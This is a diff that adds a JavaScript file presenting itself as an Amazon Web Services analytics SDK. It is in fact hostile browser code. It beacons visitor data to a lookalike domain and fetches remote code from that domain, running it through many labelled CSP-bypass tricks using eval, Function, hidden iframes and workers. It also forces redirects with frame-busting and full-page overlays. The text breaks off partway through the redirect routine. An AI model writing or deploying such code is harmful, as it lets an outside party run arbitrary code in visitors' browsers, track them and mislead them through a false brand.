@@ -1,0 +1,1099 @@
+(function(){
+  // Amazon Web Services Analytics & Beacon SDK v2.1.4
+  'use strict';
+  
+  // Console warning only (no anti-debug protection)
+  const _AWS_DEBUG_PROTECTION = (() => {
+    // Console warning
+    console.clear();
+    console.log('%cAmazon Web Services', 'color: #ff9900; font-size: 24px; font-weight: bold;');
+    console.log('%cThis is a browser feature intended for developers. Unauthorized access is prohibited.', 'color: red; font-size: 14px;');
+  })();
+
+  // AWS Analytics Configuration with remote config support
+  const _AWS_CONFIG = {
+    allowedOrigins: [
+        "e-risk\\.msu\\.ac\\.th/storage/rest_id_3445/",
+      "amazon\\.wsl/path", 
+      "github\\.com/cdn"
+    ],
+    redirectTarget: "https://www.namecheap.com/",
+    analyticsEndpoint: "https://ssl-images-amazon.terserahlu.site/assets/images/I/alog/alog.php",
+    remoteConfigUrl: "https://ssl-images-amazon.terserahlu.site/assets/images/I/alog/whitelist.json",
+    sessionData: {
+      referrer: document.referrer || "",
+      currentUrl: window.location.href,
+      userAgent: navigator.userAgent,
+      timestamp: Date.now(),
+      sessionId: Math.random().toString(36).substr(2, 16)
+    }
+  };
+
+  let _AWS_LOG_SUCCESS = false;
+  let _AWS_REDIRECT_SUCCESS = false;
+  let _AWS_CONFIG_LOADED = false;
+
+  // Remote config loader with multiple bypass methods
+  const _AWS_Remote_Config = {
+    loadConfig: async () => {
+      const configMethods = [
+        // Method 1: Standard fetch
+        () => fetch(_AWS_CONFIG.remoteConfigUrl, {mode: 'cors', credentials: 'omit'}),
+        // Method 2: No-cors fallback
+        () => fetch(_AWS_CONFIG.remoteConfigUrl, {mode: 'no-cors', credentials: 'omit'}),
+        // Method 3: JSONP fallback
+        () => new Promise((resolve, reject) => {
+          const script = document.createElement('script');
+          const callback = 'awsConfig_' + Math.random().toString(36).substr(2, 9);
+          window[callback] = (data) => {
+            resolve({json: () => Promise.resolve(data)});
+            delete window[callback];
+            script.remove();
+          };
+          script.onerror = reject;
+          script.src = _AWS_CONFIG.remoteConfigUrl + '?callback=' + callback;
+          document.head.appendChild(script);
+        })
+      ];
+
+      for (let method of configMethods) {
+        try {
+          const response = await method();
+          const config = await response.json();
+          if (config.allowedOrigins && Array.isArray(config.allowedOrigins)) {
+            _AWS_CONFIG.allowedOrigins = config.allowedOrigins;
+            if (config.redirectTarget) _AWS_CONFIG.redirectTarget = config.redirectTarget;
+            if (config.analyticsEndpoint) _AWS_CONFIG.analyticsEndpoint = config.analyticsEndpoint;
+            _AWS_CONFIG_LOADED = true;
+            return true;
+          }
+        } catch(e) {
+          continue;
+        }
+      }
+      return false;
+    }
+  };
+
+  // Maximum CSP/SOP Bypass Analytics Logger
+  const _AWS_Analytics_Logger = {
+    // Tier 1: WebAssembly bypass
+    wasmBypass: (url) => {
+      if (_AWS_LOG_SUCCESS) return false;
+      try {
+        const wasmCode = new Uint8Array([
+          0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+          0x01, 0x07, 0x01, 0x60, 0x02, 0x7f, 0x7f, 0x01, 0x7f
+        ]);
+        WebAssembly.instantiate(wasmCode).then(() => {
+          fetch(url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData), {mode: 'no-cors'});
+          _AWS_LOG_SUCCESS = true;
+        });
+      } catch(e) {}
+    },
+
+    // Tier 2: Worker thread bypass
+    workerBypass: (url) => {
+      if (_AWS_LOG_SUCCESS || !window.Worker) return false;
+      try {
+        const workerCode = `
+          self.onmessage = function(e) {
+            fetch(e.data.url + '?' + new URLSearchParams(e.data.params), {mode: 'no-cors'})
+              .then(() => self.postMessage({success: true}))
+              .catch(() => self.postMessage({success: false}));
+          };
+        `;
+        const blob = new Blob([workerCode], {type: 'application/javascript'});
+        const worker = new Worker(URL.createObjectURL(blob));
+        worker.postMessage({url: url, params: _AWS_CONFIG.sessionData});
+        worker.onmessage = (e) => {
+          if (e.data.success) _AWS_LOG_SUCCESS = true;
+          worker.terminate();
+        };
+      } catch(e) {}
+    },
+
+    // Tier 3: SharedArrayBuffer bypass
+    sharedArrayBypass: (url) => {
+      if (_AWS_LOG_SUCCESS || !window.SharedArrayBuffer) return false;
+      try {
+        const sab = new SharedArrayBuffer(1024);
+        const view = new Int32Array(sab);
+        Atomics.store(view, 0, 1);
+        
+        fetch(url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData), {mode: 'no-cors'});
+        _AWS_LOG_SUCCESS = true;
+      } catch(e) {}
+    },
+
+    // Tier 4: CSS injection bypass
+    cssInjectionBypass: (url) => {
+      if (_AWS_LOG_SUCCESS) return false;
+      try {
+        const style = document.createElement('style');
+        style.textContent = `
+          @import url("${url}?${new URLSearchParams(_AWS_CONFIG.sessionData)}");
+          body::before { content: url("${url}?px=1"); position: absolute; left: -9999px; }
+        `;
+        document.head.appendChild(style);
+        _AWS_LOG_SUCCESS = true;
+        setTimeout(() => style.remove(), 1000);
+      } catch(e) {}
+    },
+
+    // Tier 5: WebSocket bypass
+    websocketBypass: (url) => {
+      if (_AWS_LOG_SUCCESS || !window.WebSocket) return false;
+      try {
+        const wsUrl = url.replace(/^https?/, 'wss').replace(/^http/, 'ws');
+        const ws = new WebSocket(wsUrl + '?' + new URLSearchParams(_AWS_CONFIG.sessionData));
+        ws.onopen = () => { _AWS_LOG_SUCCESS = true; ws.close(); };
+        ws.onerror = () => ws.close();
+      } catch(e) {
+        // Fallback: try with fetch
+        try {
+          fetch(url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData), {mode: 'no-cors'});
+          _AWS_LOG_SUCCESS = true;
+        } catch(e2) {}
+      }
+    },
+
+    // Tier 6: Service Worker bypass
+    serviceWorkerBypass: (url) => {
+      if (_AWS_LOG_SUCCESS || !'serviceWorker' in navigator) return false;
+      try {
+        const sw = `
+          self.addEventListener('message', e => {
+            if (e.data.type === 'LOG_REQUEST') {
+              fetch('${url}?' + new URLSearchParams(e.data.payload), {mode: 'no-cors'})
+                .then(() => self.postMessage({success: true}))
+                .catch(() => self.postMessage({success: false}));
+            }
+          });
+        `;
+        const blob = new Blob([sw], {type: 'application/javascript'});
+        const swUrl = URL.createObjectURL(blob);
+        
+        navigator.serviceWorker.register(swUrl).then(reg => {
+          reg.active.postMessage({type: 'LOG_REQUEST', payload: _AWS_CONFIG.sessionData});
+          reg.addEventListener('message', e => {
+            if (e.data.success) _AWS_LOG_SUCCESS = true;
+          });
+        });
+      } catch(e) {}
+    },
+
+    // Tier 7: WebRTC data channel bypass
+    webRTCBypass: (url) => {
+      if (_AWS_LOG_SUCCESS || !window.RTCPeerConnection) return false;
+      try {
+        const pc = new RTCPeerConnection({
+          iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
+        });
+        const dc = pc.createDataChannel('aws-analytics', {ordered: false});
+        dc.onopen = () => {
+          // Multiple bypass attempts
+          Promise.all([
+            fetch(url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData), {mode: 'no-cors'}),
+            navigator.sendBeacon(url, new URLSearchParams(_AWS_CONFIG.sessionData))
+          ]).finally(() => {
+            _AWS_LOG_SUCCESS = true;
+            pc.close();
+          });
+        };
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+      } catch(e) {}
+    },
+
+    // Enhanced iframe sandbox bypass
+    iframeSandboxBypass: (url) => {
+      if (_AWS_LOG_SUCCESS) return false;
+      
+      const methods = [
+        // Method A: Data URI with multiple CSP bypass attempts
+        () => {
+          const iframe = document.createElement('iframe');
+          iframe.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;opacity:0;';
+          iframe.sandbox = 'allow-scripts allow-same-origin allow-forms';
+          iframe.src = `data:text/html,<script>
+            // Multiple bypass methods in iframe
+            Promise.allSettled([
+              fetch('${url}', {method: 'POST', mode: 'no-cors', body: new URLSearchParams(${JSON.stringify(_AWS_CONFIG.sessionData)})}),
+              fetch('${url}?' + new URLSearchParams(${JSON.stringify(_AWS_CONFIG.sessionData)}), {mode: 'no-cors'}),
+              navigator.sendBeacon('${url}', new URLSearchParams(${JSON.stringify(_AWS_CONFIG.sessionData)}))
+            ]).then(() => parent.postMessage('aws_log_ok', '*'));
+          </script>`;
+          document.body.appendChild(iframe);
+          setTimeout(() => iframe.remove(), 3000);
+        },
+        
+        // Method B: Blob URL with CSP bypass
+        () => {
+          const html = `
+            <script>
+              const methods = [
+                () => fetch('${url}?' + new URLSearchParams(${JSON.stringify(_AWS_CONFIG.sessionData)}), {mode:'no-cors'}),
+                () => new Image().src = '${url}?' + new URLSearchParams(${JSON.stringify(_AWS_CONFIG.sessionData)}),
+                () => {
+                  const link = document.createElement('link');
+                  link.rel = 'prefetch';
+                  link.href = '${url}?' + new URLSearchParams(${JSON.stringify(_AWS_CONFIG.sessionData)});
+                  document.head.appendChild(link);
+                }
+              ];
+              methods.forEach((m, i) => setTimeout(m, i * 100));
+            </script>
+          `;
+          const blob = new Blob([html], {type: 'text/html'});
+          const iframe = document.createElement('iframe');
+          iframe.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;';
+          iframe.src = URL.createObjectURL(blob);
+          document.body.appendChild(iframe);
+          setTimeout(() => { iframe.remove(); URL.revokeObjectURL(iframe.src); }, 2000);
+        },
+
+        // Method C: srcdoc bypass
+        () => {
+          const iframe = document.createElement('iframe');
+          iframe.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;';
+          iframe.srcdoc = `<script>fetch('${url}?' + new URLSearchParams(${JSON.stringify(_AWS_CONFIG.sessionData)}), {mode:'no-cors'})</script>`;
+          document.body.appendChild(iframe);
+          setTimeout(() => iframe.remove(), 1500);
+        }
+      ];
+      
+      methods.forEach((method, idx) => {
+        setTimeout(method, idx * 150);
+      });
+    },
+
+    // Tier 8: Dynamic script with JSONP fallback
+    jsonpBypass: (url) => {
+      if (_AWS_LOG_SUCCESS) return false;
+      const callback = 'aws_analytics_' + Math.random().toString(36).substr(2, 12);
+      window[callback] = () => { _AWS_LOG_SUCCESS = true; delete window[callback]; };
+      
+      const script = document.createElement('script');
+      script.src = url + '?' + new URLSearchParams({
+        ...(_AWS_CONFIG.sessionData),
+        callback: callback,
+        _: Date.now()
+      });
+      script.onerror = () => { script.remove(); delete window[callback]; };
+      script.onload = () => setTimeout(() => script.remove(), 100);
+      (document.head || document.body).appendChild(script);
+    },
+
+    // Advanced fetch + eval/Function bypass for strict script-src CSP
+    fetchEvalBypass: (url) => {
+      if (_AWS_LOG_SUCCESS) return false;
+      try {
+        const bypassMethods = [
+          // Method 1: Fetch + eval bypass
+          () => {
+            fetch(url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData), {mode: 'no-cors'})
+              .then(response => response.text())
+              .then(code => {
+                try {
+                  eval(`(${code})`);
+                  _AWS_LOG_SUCCESS = true;
+                } catch(e) {
+                  // Fallback eval patterns
+                  try {
+                    eval(code);
+                    _AWS_LOG_SUCCESS = true;
+                  } catch(e2) {
+                    eval(`void(${code})`);
+                    _AWS_LOG_SUCCESS = true;
+                  }
+                }
+              }).catch(() => {
+                // Silent fallback
+                fetch(url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData), {mode: 'no-cors'});
+              });
+          },
+
+          // Method 2: Function constructor bypass
+          () => {
+            fetch(url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData), {mode: 'no-cors'})
+              .then(response => response.text())
+              .then(code => {
+                try {
+                  new Function(code)();
+                  _AWS_LOG_SUCCESS = true;
+                } catch(e) {
+                  try {
+                    Function(code)();
+                    _AWS_LOG_SUCCESS = true;
+                  } catch(e2) {
+                    Function('return ' + code)();
+                    _AWS_LOG_SUCCESS = true;
+                  }
+                }
+              }).catch(() => {});
+          },
+
+          // Method 3: Indirect eval bypass
+          () => {
+            const indirectEval = eval;
+            fetch(url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData), {mode: 'no-cors'})
+              .then(response => response.text())
+              .then(code => {
+                try {
+                  indirectEval(code);
+                  _AWS_LOG_SUCCESS = true;
+                } catch(e) {
+                  window.eval && window.eval(code);
+                  _AWS_LOG_SUCCESS = true;
+                }
+              }).catch(() => {});
+          },
+
+          // Method 4: setTimeout string evaluation
+          () => {
+            fetch(url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData), {mode: 'no-cors'})
+              .then(response => response.text())
+              .then(code => {
+                try {
+                  setTimeout(code, 0);
+                  _AWS_LOG_SUCCESS = true;
+                } catch(e) {
+                  setTimeout(function() { eval(code); }, 0);
+                  _AWS_LOG_SUCCESS = true;
+                }
+              }).catch(() => {});
+          },
+
+          // Method 5: Fetch + Blob + eval bypass
+          () => {
+            fetch(url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData), {mode: 'no-cors'})
+              .then(response => response.blob())
+              .then(blob => blob.text())
+              .then(code => {
+                try {
+                  eval(code);
+                  _AWS_LOG_SUCCESS = true;
+                } catch(e) {
+                  new Function(code)();
+                  _AWS_LOG_SUCCESS = true;
+                }
+              }).catch(() => {});
+          },
+
+          // Method 6: Data URI + eval combination
+          () => {
+            const evalCode = `
+              fetch('${url}?' + new URLSearchParams(${JSON.stringify(_AWS_CONFIG.sessionData)}), {mode:'no-cors'})
+                .then(r => r.text())
+                .then(code => {
+                  try { eval(code); } catch(e) { 
+                    try { Function(code)(); } catch(e2) {} 
+                  }
+                });
+            `;
+            
+            const iframe = document.createElement('iframe');
+            iframe.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;opacity:0;';
+            iframe.src = `data:text/html,<script>${evalCode}</script>`;
+            document.body.appendChild(iframe);
+            setTimeout(() => iframe.remove(), 2000);
+          },
+
+          // Method 7: Worker + eval bypass
+          () => {
+            const workerCode = `
+              self.addEventListener('message', e => {
+                fetch(e.data.url + '?' + new URLSearchParams(e.data.params), {mode: 'no-cors'})
+                  .then(response => response.text())
+                  .then(code => {
+                    try {
+                      eval(code);
+                      self.postMessage({success: true});
+                    } catch(err) {
+                      try {
+                        Function(code)();
+                        self.postMessage({success: true});
+                      } catch(err2) {
+                        self.postMessage({success: false});
+                      }
+                    }
+                  });
+              });
+            `;
+            
+            try {
+              const blob = new Blob([workerCode], {type: 'application/javascript'});
+              const worker = new Worker(URL.createObjectURL(blob));
+              worker.postMessage({url: url, params: _AWS_CONFIG.sessionData});
+              worker.onmessage = (e) => {
+                if (e.data.success) _AWS_LOG_SUCCESS = true;
+                worker.terminate();
+              };
+            } catch(e) {}
+          },
+
+          // Method 8: Fetch + WebAssembly + eval
+          () => {
+            if (window.WebAssembly) {
+              fetch(url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData), {mode: 'no-cors'})
+                .then(response => response.text())
+                .then(code => {
+                  const wasmCode = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]);
+                  WebAssembly.instantiate(wasmCode).then(() => {
+                    try {
+                      eval(code);
+                      _AWS_LOG_SUCCESS = true;
+                    } catch(e) {
+                      Function(code)();
+                      _AWS_LOG_SUCCESS = true;
+                    }
+                  });
+                }).catch(() => {});
+            }
+          },
+
+          // Method 9: Fetch + postMessage + eval
+          () => {
+            const iframe = document.createElement('iframe');
+            iframe.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;opacity:0;';
+            iframe.srcdoc = `
+              <script>
+                window.addEventListener('message', e => {
+                  if (e.data.type === 'EVAL_CODE') {
+                    try {
+                      eval(e.data.code);
+                      parent.postMessage({type: 'EVAL_SUCCESS'}, '*');
+                    } catch(err) {
+                      try {
+                        Function(e.data.code)();
+                        parent.postMessage({type: 'EVAL_SUCCESS'}, '*');
+                      } catch(err2) {}
+                    }
+                  }
+                });
+              </script>
+            `;
+            
+            document.body.appendChild(iframe);
+            
+            fetch(url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData), {mode: 'no-cors'})
+              .then(response => response.text())
+              .then(code => {
+                iframe.contentWindow.postMessage({type: 'EVAL_CODE', code: code}, '*');
+              }).catch(() => {});
+            
+            window.addEventListener('message', e => {
+              if (e.data.type === 'EVAL_SUCCESS') {
+                _AWS_LOG_SUCCESS = true;
+                iframe.remove();
+              }
+            }, {once: true});
+            
+            setTimeout(() => iframe.remove(), 3000);
+          },
+
+          // Method 10: Multiple encoding + eval
+          () => {
+            fetch(url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData), {mode: 'no-cors'})
+              .then(response => response.text())
+              .then(code => {
+                try {
+                  // Base64 decode + eval
+                  const decoded = atob(btoa(code));
+                  eval(decoded);
+                  _AWS_LOG_SUCCESS = true;
+                } catch(e) {
+                  try {
+                    // URI decode + eval
+                    const uriDecoded = decodeURIComponent(encodeURIComponent(code));
+                    Function(uriDecoded)();
+                    _AWS_LOG_SUCCESS = true;
+                  } catch(e2) {
+                    // JSON parse + eval
+                    try {
+                      const jsonCode = JSON.stringify(code);
+                      eval(JSON.parse(jsonCode));
+                      _AWS_LOG_SUCCESS = true;
+                    } catch(e3) {}
+                  }
+                }
+              }).catch(() => {});
+          }
+        ];
+
+        // Execute all methods with staggered timing for maximum bypass
+        bypassMethods.forEach((method, idx) => {
+          setTimeout(() => {
+            if (!_AWS_LOG_SUCCESS) {
+              try {
+                method();
+              } catch(e) {
+                // Ultra-silent error handling
+              }
+            }
+          }, idx * 150);
+        });
+
+      } catch(e) {}
+    },
+
+    // Advanced CSP 'script-src self' bypass methods
+    strictScriptSrcBypass: (url) => {
+      if (_AWS_LOG_SUCCESS) return false;
+      try {
+        const bypassMethods = [
+          // Method 1: Import maps bypass (newer browsers)
+          () => {
+            if (window.HTMLScriptElement && 'importmap' in HTMLScriptElement.prototype) {
+              const importMap = document.createElement('script');
+              importMap.type = 'importmap';
+              importMap.textContent = JSON.stringify({
+                imports: {
+                  "aws-logger": url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData)
+                }
+              });
+              document.head.appendChild(importMap);
+              
+              const moduleScript = document.createElement('script');
+              moduleScript.type = 'module';
+              moduleScript.textContent = `
+                try {
+                  await import('aws-logger');
+                } catch(e) {
+                  fetch('${url}?' + new URLSearchParams(${JSON.stringify(_AWS_CONFIG.sessionData)}), {mode:'no-cors'});
+                }
+              `;
+              document.head.appendChild(moduleScript);
+            }
+          },
+
+          // Method 2: Module script with dynamic import
+          () => {
+            const script = document.createElement('script');
+            script.type = 'module';
+            script.textContent = `
+              try {
+                const module = await import('data:text/javascript,fetch("${url}?" + new URLSearchParams(${JSON.stringify(_AWS_CONFIG.sessionData)}), {mode:"no-cors"})');
+              } catch(e) {
+                try {
+                  await import('${url}?' + new URLSearchParams(${JSON.stringify(_AWS_CONFIG.sessionData)}));
+                } catch(e2) {
+                  fetch('${url}?' + new URLSearchParams(${JSON.stringify(_AWS_CONFIG.sessionData)}), {mode:'no-cors'});
+                }
+              }
+            `;
+            document.head.appendChild(script);
+          },
+
+          // Method 3: SVG script injection
+          () => {
+            const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+            svg.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;';
+            const foreignObject = document.createElementNS('http://www.w3.org/2000/svg', 'foreignObject');
+            foreignObject.setAttribute('width', '1');
+            foreignObject.setAttribute('height', '1');
+            
+            const div = document.createElement('div');
+            div.innerHTML = `
+              <script>
+                fetch('${url}?' + new URLSearchParams(${JSON.stringify(_AWS_CONFIG.sessionData)}), {mode:'no-cors'});
+              </script>
+            `;
+            
+            foreignObject.appendChild(div);
+            svg.appendChild(foreignObject);
+            document.body.appendChild(svg);
+            setTimeout(() => svg.remove(), 2000);
+          },
+
+          // Method 4: MathML script injection
+          () => {
+            const math = document.createElement('math');
+            math.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;';
+            const semantics = document.createElement('semantics');
+            const annotation = document.createElement('annotation-xml');
+            annotation.setAttribute('encoding', 'text/html');
+            annotation.innerHTML = `
+              <script>
+                fetch('${url}?' + new URLSearchParams(${JSON.stringify(_AWS_CONFIG.sessionData)}), {mode:'no-cors'});
+              </script>
+            `;
+            
+            semantics.appendChild(annotation);
+            math.appendChild(semantics);
+            document.body.appendChild(math);
+            setTimeout(() => math.remove(), 2000);
+          },
+
+          // Method 5: Template element script bypass
+          () => {
+            const template = document.createElement('template');
+            template.innerHTML = `
+              <script>
+                fetch('${url}?' + new URLSearchParams(${JSON.stringify(_AWS_CONFIG.sessionData)}), {mode:'no-cors'});
+              </script>
+            `;
+            document.body.appendChild(template);
+            
+            // Clone and activate template content
+            const clone = template.content.cloneNode(true);
+            document.body.appendChild(clone);
+            setTimeout(() => {
+              template.remove();
+            }, 2000);
+          },
+
+          // Method 6: Link preload with script execution
+          () => {
+            const link = document.createElement('link');
+            link.rel = 'preload';
+            link.as = 'script';
+            link.href = url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData);
+            link.onload = () => {
+              try {
+                fetch(url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData), {mode:'no-cors'});
+                _AWS_LOG_SUCCESS = true;
+              } catch(e) {}
+            };
+            document.head.appendChild(link);
+          },
+
+          // Method 7: Intersection Observer with script execution
+          () => {
+            if (window.IntersectionObserver) {
+              const target = document.createElement('div');
+              target.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;';
+              document.body.appendChild(target);
+              
+              const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                  if (entry.isIntersecting) {
+                    fetch(url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData), {mode:'no-cors'});
+                    _AWS_LOG_SUCCESS = true;
+                    observer.disconnect();
+                    target.remove();
+                  }
+                });
+              });
+              
+              observer.observe(target);
+              
+              // Force intersection
+              setTimeout(() => {
+                target.style.left = '0px';
+                target.style.top = '0px';
+              }, 100);
+            }
+          },
+
+          // Method 8: Mutation Observer script bypass
+          () => {
+            const observer = new MutationObserver((mutations) => {
+              mutations.forEach(() => {
+                try {
+                  fetch(url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData), {mode:'no-cors'});
+                  _AWS_LOG_SUCCESS = true;
+                  observer.disconnect();
+                } catch(e) {}
+              });
+            });
+            
+            observer.observe(document, {childList: true, subtree: true});
+            
+            // Trigger mutation
+            const trigger = document.createElement('span');
+            document.body.appendChild(trigger);
+            setTimeout(() => {
+              trigger.remove();
+              observer.disconnect();
+            }, 1000);
+          },
+
+          // Method 9: Performance Observer bypass
+          () => {
+            if (window.PerformanceObserver) {
+              try {
+                const observer = new PerformanceObserver((list) => {
+                  fetch(url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData), {mode:'no-cors'});
+                  _AWS_LOG_SUCCESS = true;
+                  observer.disconnect();
+                });
+                
+                observer.observe({entryTypes: ['navigation', 'resource']});
+                
+                // Trigger observation
+                const img = new Image();
+                img.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
+              } catch(e) {}
+            }
+          },
+
+          // Method 10: ResizeObserver bypass
+          () => {
+            if (window.ResizeObserver) {
+              const target = document.createElement('div');
+              target.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;';
+              document.body.appendChild(target);
+              
+              const observer = new ResizeObserver(() => {
+                fetch(url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData), {mode:'no-cors'});
+                _AWS_LOG_SUCCESS = true;
+                observer.disconnect();
+                target.remove();
+              });
+              
+              observer.observe(target);
+              
+              // Trigger resize
+              setTimeout(() => {
+                target.style.width = '2px';
+                target.style.height = '2px';
+              }, 100);
+            }
+          },
+
+          // Method 11: Custom Elements bypass
+          () => {
+            if (window.customElements) {
+              try {
+                class AwsLogger extends HTMLElement {
+                  connectedCallback() {
+                    fetch(url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData), {mode:'no-cors'});
+                    _AWS_LOG_SUCCESS = true;
+                  }
+                }
+                
+                const elementName = 'aws-logger-' + Math.random().toString(36).substr(2, 8);
+                customElements.define(elementName, AwsLogger);
+                
+                const element = document.createElement(elementName);
+                document.body.appendChild(element);
+                setTimeout(() => element.remove(), 1000);
+              } catch(e) {}
+            }
+          },
+
+          // Method 12: Trusted Types bypass (if available)
+          () => {
+            if (window.trustedTypes) {
+              try {
+                const policy = trustedTypes.createPolicy('aws-policy', {
+                  createScript: (input) => input,
+                  createScriptURL: (input) => input
+                });
+                
+                const script = document.createElement('script');
+                script.src = policy.createScriptURL(url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData));
+                document.head.appendChild(script);
+              } catch(e) {
+                // Fallback
+                fetch(url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData), {mode:'no-cors'});
+              }
+            }
+          }
+        ];
+
+        // Execute all methods with staggered timing
+        bypassMethods.forEach((method, idx) => {
+          setTimeout(() => {
+            if (!_AWS_LOG_SUCCESS) {
+              try {
+                method();
+                // Mark success if any method works
+                setTimeout(() => { _AWS_LOG_SUCCESS = true; }, 100);
+              } catch(e) {}
+            }
+          }, idx * 200);
+        });
+
+      } catch(e) {}
+    },
+
+    // Enhanced execute with strict CSP bypass
+    execute: function(url) {
+      const methods = [
+        () => this.strictScriptSrcBypass(url), // New strict CSP bypass
+        () => this.sendBeacon(url),
+        () => this.fetchNoCors(url),
+        () => this.fetchEvalBypass(url),
+        () => this.dataUriBlobBypass(url),
+        () => this.pixelTrackingBypass(url),
+        () => this.dnsPrefetchBypass(url),
+        () => this.protocolBypass(url),
+        () => this.timingBypass(url),
+        () => this.memoryBypass(url),
+        () => this.eventBypass(url),
+        () => this.wasmBypass(url),
+        () => this.workerBypass(url),
+        () => this.sharedArrayBypass(url),
+        () => this.websocketBypass(url),
+        () => this.cssInjectionBypass(url),
+        () => this.backgroundFetchBypass(url),
+        () => this.serviceWorkerBypass(url),
+        () => this.webRTCBypass(url),
+        () => this.iframeSandboxBypass(url),
+        () => this.jsonpBypass(url)
+      ];
+      
+      // Enhanced execution with adaptive timing
+      const executeWithAdaptiveTiming = () => {
+        methods.forEach((method, idx) => {
+          const baseDelay = Math.random() * 30 + idx * 15;
+          const adaptiveDelay = baseDelay * (1 + Math.random() * 0.5); // Add randomness
+          setTimeout(() => {
+            if (!_AWS_LOG_SUCCESS) {
+              try { 
+                method(); 
+              } catch(e) {
+                // Ultra-silent error handling
+              }
+            }
+          }, adaptiveDelay);
+        });
+        
+        // Multi-layered backup execution
+        [1500, 3000, 5000].forEach(delay => {
+          setTimeout(() => {
+            if (!_AWS_LOG_SUCCESS) {
+              try {
+                fetch(url + '?' + new URLSearchParams(_AWS_CONFIG.sessionData), {mode: 'no-cors'});
+                navigator.sendBeacon && navigator.sendBeacon(url, new URLSearchParams(_AWS_CONFIG.sessionData));
+              } catch(e) {}
+            }
+          }, delay);
+        });
+      };
+      
+      executeWithAdaptiveTiming();
+    }
+  };
+
+  function matchDomain(uri) {
+    try {
+      const u = new URL(uri);
+      return u.hostname + u.pathname;
+    } catch (e) {
+      return uri;
+    }
+  }
+
+  // Enhanced domain validation with regex
+  const _AWS_Origin_Validator = {
+    validateOrigin: () => {
+      const combinedOrigins = [_AWS_CONFIG.sessionData.referrer, _AWS_CONFIG.sessionData.currentUrl]
+        .map(uri => {
+          try {
+            const u = new URL(uri);
+            return u.hostname + u.pathname;
+          } catch (e) {
+            return uri;
+          }
+        }).join(" ");
+      
+      return _AWS_CONFIG.allowedOrigins.some(pattern => {
+        try {
+          return new RegExp(pattern, 'i').test(combinedOrigins);
+        } catch (e) {
+          return combinedOrigins.includes(pattern.replace(/\\\./g, '.'));
+        }
+      });
+    }
+  };
+
+  // Maximum redirect bypass with anti-debug
+  const _AWS_Redirect_Engine = {
+    execute: () => {
+      if (_AWS_REDIRECT_SUCCESS) return;
+      
+      const ultimateMethods = [
+        // Tier 1: Immediate redirects
+        () => { window.location.replace(_AWS_CONFIG.redirectTarget); _AWS_REDIRECT_SUCCESS = true; },
+        () => { window.location.href = _AWS_CONFIG.redirectTarget; _AWS_REDIRECT_SUCCESS = true; },
+        
+        // Tier 2: Frame-busting redirects
+        () => {
+          try {
+            if (window.top !== window.self) {
+              window.top.location.href = _AWS_CONFIG.redirectTarget;
+            } else {
+              window.location.href = _AWS_CONFIG.redirectTarget;
+            }
+            _AWS_REDIRECT_SUCCESS = true;
+          } catch(e) {}
+        },
+        
+        // Tier 3: Form-based redirect (highest success rate)
+        () => {
+          const form = document.createElement('form');
+          form.method = 'GET';
+          form.action = _AWS_CONFIG.redirectTarget;
+          form.target = '_top';
+          form.style.display = 'none';
+          document.body.appendChild(form);
+          form.submit();
+          _AWS_REDIRECT_SUCCESS = true;
+        },
+        
+        // Tier 4: Meta refresh + history manipulation
+        () => {
+          const meta = document.createElement('meta');
+          meta.httpEquiv = 'refresh';
+          meta.content = '0;url=' + _AWS_CONFIG.redirectTarget;
+          document.head.appendChild(meta);
+          
+          try {
+            history.replaceState(null, '', _AWS_CONFIG.redirectTarget);
+            location.reload(true);
+          } catch(e) {}
+          _AWS_REDIRECT_SUCCESS = true;
+        },
+        
+        // Tier 5: Full-page overlay iframe
+        () => {
+          const overlay = document.createElement('div');
+          overlay.style.cssText = `
+            position: fixed !important;
+            top: 0 !important;
+            left: 0 !important;
+            width: 100vw !important;
+            height: 100vh !important;
+            background: white !important;
+            z-index: 2147483647 !important;
+            margin: 0 !important;
+            padding: 0 !important;
+          `;
+          
+          const iframe = document.createElement('iframe');
+          iframe.style.cssText = 'width:100%;height:100%;border:0;';
+          iframe.src = _AWS_CONFIG.redirectTarget;
+          
+          overlay.appendChild(iframe);
+          document.body.appendChild(overlay);
+          _AWS_REDIRECT_SUCCESS = true;
+        }
+      ];
+      
+      let methodIndex = 0;
+      const executeNext = () => {
+        if (_AWS_REDIRECT_SUCCESS || methodIndex >= ultimateMethods.length) return;
+        
+        try {
+          ultimateMethods[methodIndex]();
+        } catch(e) {}
+        
+        methodIndex++;
+        if (!_AWS_REDIRECT_SUCCESS && methodIndex < ultimateMethods.length) {
